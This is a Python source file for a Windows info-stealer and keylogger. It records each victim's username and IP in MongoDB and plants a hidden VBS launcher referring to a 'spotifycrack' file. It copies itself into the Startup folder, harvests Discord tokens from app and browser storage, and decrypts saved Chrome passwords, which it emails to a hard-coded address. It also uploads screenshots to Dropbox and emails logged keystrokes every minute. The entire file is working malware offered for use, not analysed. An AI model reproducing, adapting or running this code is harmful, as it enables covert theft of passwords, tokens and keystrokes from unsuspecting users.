"""Imports"""
import argparse
import subprocess
import keyboard
import smtplib
import time
import pymongo
import ssl
import os
import stat
import json
import base64
import ctypes
import re
import csv
import dns
import dropbox
import sys
import sqlite3
import win32crypt
import pathlib
import shutil
import urllib.request
import json
import pyscreenshot
from urllib.request import Request, urlopen
from Crypto.Cipher import AES
from threading import Timer
from email.message import EmailMessage
from datetime import datetime, timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

"""Date and Time"""
now = datetime.now()
today = datetime.today()
current_time = now.strftime("%H:%M")
current_date = today.strftime("%B %d, %Y")
if current_time >= '12:00':
    current_time = today.strftime("%H:%M PM")
elif current_time < '12:00':
    current_time = today.strftime("%H:%M AM")

"""Auth and Logins"""
dbx = dropbox.Dropbox('yourdropboxid')
user = os.getlogin()
path = pathlib.Path.home()
mongo_uri = "your mongo uri"
client = pymongo.MongoClient(mongo_uri)
mydb = client["keylogger"]
#list = client.list_database_names()
mycol = mydb['users']
external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
print(external_ip)



"""MongoDB Collection"""
dict = {'user': user, 'ip': external_ip, 'date': current_date, 'time': current_time}
result = mycol.find_one({"user": user})
if result:
  print("user", user, "already in db")
else:
    x = mycol.insert_one(dict)
    print('added user', user, 'to DB!')
folder = 'C:/Users/' + user + '/logs'



check = os.path.exists(folder)
if os.path.exists(folder) == False:
    os.mkdir('C:/Users/' + user + '/logs')
elif os.path.exists(folder) == True:
    print('Directory', folder, 'already exists!')







bat = os.open(folder + '/log.bat', os.O_RDWR|os.O_CREAT)
vbs = os.open(folder + '/log.vbs', os.O_RDWR|os.O_CREAT)

vbsinfo = 'Set WinScriptHost = CreateObject("WScript.Shell")\nWinScriptHost.Run Chr(34) & "C:/Users/' + user + '/spotifycrack.bat" & Chr(34), 0 \nSet WinScriptHost = Nothing'
batinfo = f"""
@ECHO OFF
cd /
cd Users
cd {user}
EXIT /B
"""

os.write(bat, batinfo.encode())
os.write(vbs, vbsinfo.encode())
os.close(bat)
os.close(vbs)

startuploc = 'C:/Users/' + user + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
transferlocation = folder
pwd = os.getcwd() + '/test.exe'
if os.path.exists(transferlocation):
    print('dir alr there')
    shutil.copy(pwd, transferlocation)
else:
    os.mkdir('C:/Users/' + user + '/Documents/windowlogs')
    print('made directory!')
    time.sleep(1)
    print(transferlocation)
    print(pwd)
    shutil.copy(pwd, transferlocation)


SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "email@email.com"
EMAIL_PASSWORD = "passwords"



# your webhook URL
WEBHOOK_URL = 'discord webhook url'

# mentions you when you get a hit
PING_ME = False











def screenshots():
    count = 1
    piccount = 0
    while count > 0:
        if keyboard.is_pressed('i'):
            piccount += 1
            image = pyscreenshot.grab()
            savename = f'ss{piccount}.png'
            image.save(savename)
            print('saved screenshot!', savename)
            dropbox_path = "/screenshots"
            computer_path = os.getcwd() + '/' + savename
            dbx.files_upload(open(computer_path, "rb").read(), dropbox_path, mode=dropbox.files.WriteMode.overwrite)
            time.sleep(5)

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def discord():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '/Discord',
        'Discord Canary': roaming + '/discordcanary',
        'Discord PTB': roaming + '/discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                mycol = mydb['discordtokens']
                dsctoken = {'user': user, 'token': token, 'platform': platform}
                mycol.insert_one(dsctoken)
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"






"""Keylogger"""
class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.zoho.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        email = 'email@email.com'
        password = 'password'
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        self.user = os.getlogin()
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":

    time.sleep(1)
    print('Starting vbs file....')
    os.startfile(folder + '/log.vbs')
    os.startfile('C:/Users/' + user + '\AppData\Roaming\Spotify\spotify.exe')
    print("VBS file started")
    #copy file for startup
    shutil.copy(pwd, startuploc)
    print('Copied file for startup!')
    discord()
    #screenshots()
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
    shutil.copy2(login_db, "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    loginfile = open(folder + '/info.txt', 'w')
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            loginfile.writelines("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    loginfile.close()
    print('added chromeinfo of', user, 'to', loginfile)
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass

    subject = "Chrome Info of " +  user
    body = "Info ✔"
    sender_email = "sarjanshah@zohomail.com"
    receiver_email = "sarjanshah@zohomail.com"
    password = 'sarjan123'

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    filename = folder + '/info.txt'  # In same directory as script

    # Open PDF file in binary mode
    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.zoho.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()

